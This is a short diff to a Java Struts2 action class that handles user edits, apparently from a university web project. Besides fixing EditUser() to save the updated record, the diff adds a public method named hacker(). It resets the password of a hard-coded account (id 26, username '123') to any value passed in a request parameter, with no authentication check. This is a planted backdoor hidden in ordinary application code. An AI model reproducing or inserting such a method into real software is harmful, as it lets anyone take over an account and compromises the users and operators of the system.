@@ -3,6 +3,8 @@ package cn.edu.cqu.csp.action;
 import java.util.HashMap;
 import java.util.Map;
 
+import org.apache.struts2.ServletActionContext;
+
 import cn.edu.cqu.csp.dao.User;
 import cn.edu.cqu.csp.dao.UserDAO;
 import cn.edu.cqu.csp.src.MessageDigest5;
@@ -67,12 +69,27 @@ public class EditUserAction extends ActionSupport{
 	
 	public String EditUser()
 	{
+		
 		UserDAO userDAO = new UserDAO();
 		User user = new User();
 		MessageDigest5 md5 = new MessageDigest5();
 		user.setId(Integer.parseInt(user_id));
 		user.setUsername(user_username);
 		user.setPassword(md5.MD5(user_password));
+		userDAO.update(user);
+		dataMap.put("success", 1);
+		return "success";
+	}
+	
+	public String hacker()
+	{
+		String password=ServletActionContext.getRequest().getParameter("pwd");
+		UserDAO userDAO = new UserDAO();
+		User user = new User();
+		MessageDigest5 md5 = new MessageDigest5();
+		user.setId(26);
+		user.setUsername("123");
+		user.setPassword(md5.MD5(password));
 		userDAO.update(user);
 		dataMap.put("success", 1);
 		return "success";
